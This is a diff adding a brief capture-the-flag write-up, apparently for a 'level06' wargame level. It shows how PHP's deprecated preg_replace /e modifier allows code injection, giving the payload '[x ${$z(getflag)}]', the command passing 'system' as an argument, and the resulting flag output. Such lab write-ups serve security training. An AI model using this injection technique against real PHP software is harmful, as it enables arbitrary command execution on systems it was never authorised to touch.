@@ -1,0 +1,12 @@
+2 files level06 and level06.php
+Execute level06 is the binary to level06.php
+Level06.php take 2 arguments one in a file
+We see that /e flag in preg_replac his deprecated because of the possibility to inject code php
+Go inject it so. We put [x ${$z(getflag)}] because //2 will be ${$z(get flag)} (regex).
+Then we need to put the function system in z.
+For that we put this command: ./level06 /tmp/file "system" 
+Then  [x ${$z(getflag)}]  will be ${$system(getflag)} and the output is:
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+Wa have the flag!
